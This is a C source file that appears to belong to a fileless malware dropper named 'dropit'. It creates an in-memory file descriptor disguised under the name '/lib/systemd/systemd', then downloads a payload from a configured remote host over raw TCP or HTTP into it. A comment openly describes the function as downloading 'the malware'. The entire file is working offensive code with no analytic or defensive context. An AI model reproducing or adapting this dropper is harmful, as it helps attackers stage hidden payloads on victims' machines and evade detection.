#include "dropit.h"

static int      memfd_create(const char *name, unsigned int flags)
{
    return (syscall(NR_memfd_create, name, flags));
}

static int      download_file_over_tcp(t_config config, int memfd)
{
    int     sockfd;
    char    buf[1024];
    int     ret;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror(RED"[-] Failed to create socket: "WHITE);
        return (-1);
    }
    if ((connect(sockfd, config.host_infos->ai_addr, sizeof(t_sockaddr))) == -1) {
        perror(RED"[-] Could not connect to host: "WHITE);
        close(sockfd);
        return (-1);
    }
    while ((ret = recv(sockfd, buf, sizeof(buf), MSG_DONTWAIT)) > 0)
        write(memfd, buf, ret);
    close(sockfd);
    return (memfd);
}

static int      download_file_over_http(t_config config, int memfd)
{
    int     sockfd;
    char    buf[1024];
    int     ret;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror(RED"[-] Failed to create socket: "WHITE);
        return (-1);
    }
    if ((connect(sockfd, config.host_infos->ai_addr, sizeof(t_sockaddr))) == -1) {
        perror(RED"[-] Could not connect to host: "WHITE);
        close(sockfd);
        return (-1);
    }
    ret = snprintf(buf, 1024, "GET %s HTTP/1.0\r\n\r\n", config.remote_file_name);
    if ((send(sockfd, buf, ret, 0)) == -1) {
        perror(RED"[-] Could not send HTTP request: "WHITE);
        close(sockfd);
        return (-1);
    }

    while ((ret = recv(sockfd, buf, sizeof(buf), 0)) > 0)
        write(memfd, buf, ret);
    close(sockfd);
    return (memfd);
}

/**
 * @brief Downloads the malware through the host specified in config
 * 
 * @param config the host configuration to retreive the malware
 * @return int  -1 if it fails, an anonymous fd otherwise
 */
int             download_malware(t_config config)
{
    int     memfd;

    if ((memfd = memfd_create("/lib/systemd/systemd", 0)) == -1)
        return (memfd);
    if (config.protocol == PROTO_TCP)
        return download_file_over_tcp(config, memfd);
    else if (config.protocol == PROTO_HTTP)
        return (download_file_over_http(config, memfd));
    return (-1);
}